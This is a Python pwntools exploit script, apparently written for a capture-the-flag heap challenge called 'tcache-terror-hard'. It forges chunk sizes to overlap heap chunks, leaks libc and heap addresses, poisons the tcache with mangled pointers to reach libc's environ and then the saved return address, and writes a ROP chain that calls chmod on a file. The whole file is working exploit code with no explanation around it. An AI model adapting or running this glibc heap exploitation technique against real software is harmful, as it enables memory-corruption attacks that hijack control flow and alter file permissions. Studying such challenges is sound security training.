from pwn import *

p = process("/challenge/tcache-terror-hard")

libc_io_2_1_stderr_offset = 0x21a6a0
libc_environ_offset = 0x221200
libc_filename_offset = 0x19688
libc_chmod_offset = 0x114440
libc_pop_rdi_ret_offset = 0x2a3e5
libc_pop_rsi_ret_offset = 0x2be51

stack_leak_to_rbp_offset = 0x128

def extract_pointers(byte_data):
    addresses = []

    for i in range(len(byte_data) - 7):

        chunk = byte_data[i:i+8]
        val = struct.unpack('<Q', chunk)[0]

        if 0x400000 <= val <= 0x7fffffffffff:
            addresses.append((val))

    return addresses

def demangle(mangled_ptr):
    mid = mangled_ptr ^ (mangled_ptr >> 12)
    return mid ^ (mid >> 24)

def mangle(pos, ptr):
    return ptr ^ (pos >> 12)

print(p.clean())

p.sendline(b"malloc 0 16")
p.sendline(b"malloc 1 16")
#p.sendline(b"malloc 2 16")
#p.sendline(b"malloc 3 16")

print(p.clean())

p.sendline(b"safe_read 0")
p.sendline(b"\x00" * 16 + b"\x00" * 8 + p64(0x380)) # overwrote the allocated chunk's size to 0x380

print(p.clean())

p.sendline(b"free 1") # next malloc'd chunk will overlap with all other chunks upto +0x380

print(p.clean())

p.sendline(b"malloc 2 888")

print(p.clean())

p.sendline(b"safe_write 2")

x = p.clean()

print(x)

leaked_addr = extract_pointers(x)

print("___ LEAKED ADDRESSES ___")
print([hex(elem) for elem in leaked_addr])
print("___ LEAKED ADDRESSES ___")

libc_leak_io_err = leaked_addr[19]
print("[+] Leaked ", hex(libc_leak_io_err))

libc_base_addr = libc_leak_io_err - libc_io_2_1_stderr_offset
environ_addr = libc_base_addr + libc_environ_offset

print("[+] Libc Base Address : ", hex(libc_base_addr))
print("[+] environ address : ", hex(environ_addr))

leaked_heap_addr = leaked_addr[8]

print("[+] Picked Heap Addr : ", hex(leaked_heap_addr))

mangled_environ_target_addr = mangle(leaked_heap_addr, environ_addr) # just cuz their offsets kinda okay with alignment o/w fix it

print("[+] (mangled) Environ TargetAddr on Heap : ", hex(mangled_environ_target_addr))

p.sendline(b"malloc 3 16")
p.sendline(b"malloc 4 16")
p.sendline(b"malloc 5 16")
p.sendline(b"malloc 6 16")

print(p.clean())

p.sendline(b"free 6")
p.sendline(b"free 5")

p.sendline(b"safe_read 3")
p.sendline(b"\x00" * 16 + b"\x00" * 8 + p64(0x40)) # overwrote the allocated chunk's size

print(p.clean())

p.sendline(b"free 4")

print(p.clean())

p.sendline(b"malloc 7 48")

print(p.clean())

p.sendline(b"safe_read 7")
p.sendline(b"\x00" * 16 + b"\x00" * 16 + p64(mangled_environ_target_addr)) # overwrote the next_ptr of chunk 5

print(p.clean())

p.sendline(b"malloc 8 16")

print(p.clean())

p.sendline(b"malloc 9 16") # environ allocated addr

print(p.clean())

p.sendline(b"safe_write 9")

x = p.clean()
leaked_stack_addr = int.from_bytes(x.split(b'\n')[2].split(b'\x00')[0], "little")

print("[+] Leaked Stack Addr : ", hex(leaked_stack_addr))

current_rbp_addr = leaked_stack_addr - stack_leak_to_rbp_offset

print("[+] Current rbp : ", hex(current_rbp_addr))

saved_rip_addr = current_rbp_addr + 0x8
chmod_addr = libc_base_addr + libc_chmod_offset

print("[+] saved_rip :: ", hex(saved_rip_addr))
print("[+] chmod_arr :: ", hex(chmod_addr))

# allocate chunk at current_rbp (cuz 0xf alignment i.e last nibble be 0)

# pop_rdi_ret + filename_addr + pop_rsi_ret + mode + chmod_addr
# write to saved_rip_addr from [saved_rip_addr, saved_rip_addr + 40]

mangled_current_rbp_target_addr = mangle(leaked_heap_addr, current_rbp_addr)

print("[+] (mangled) current_rbp_target_addr :: ", hex(mangled_current_rbp_target_addr))

p.sendline(b"malloc 3 48")
p.sendline(b"malloc 4 48")
p.sendline(b"malloc 5 48")
p.sendline(b"malloc 6 48")

p.sendline(b"free 6")
p.sendline(b"free 5")

print(p.clean(0))

p.sendline(b"safe_read 3")
p.sendline(b"\x00" * 48 + b"\x00" * 8 + p64(0x60)) # overwrote the allocated chunk's size

print(p.clean())

p.sendline(b"free 4") # next malloc'd will overlap with 5th chunk

print(p.clean())

p.sendline(b"malloc 7 80")

print(p.clean())

p.sendline(b"safe_read 7")
p.sendline(b"\x00" * 48 + b"\x00" * 16 + p64(mangled_current_rbp_target_addr)) # overwrote the next_ptr of chunk 5

print(p.clean())

p.sendline(b"malloc 8 48")

print(p.clean())

p.sendline(b"malloc 9 48") # current_rbp allocated addr

print(p.clean())

p.sendline(b"safe_read 9")

payload = b""
payload += b"\x00" * 8 # buffer (cuz we at current_rbp) and saved_rip = current_rbp + 0x8
payload += p64(libc_base_addr + libc_pop_rdi_ret_offset) # pop rdi; ret
payload += p64(libc_base_addr + libc_filename_offset) # filename addr (fchflags)
payload += p64(libc_base_addr + libc_pop_rsi_ret_offset) # pop rsi; ret
payload += p64(0x4) # mode = 0x4
payload += p64(libc_base_addr + libc_chmod_offset) # chmod(filename, mode)

p.sendline(payload)

p.sendline(b"quit")
print(p.clean())

p.close()
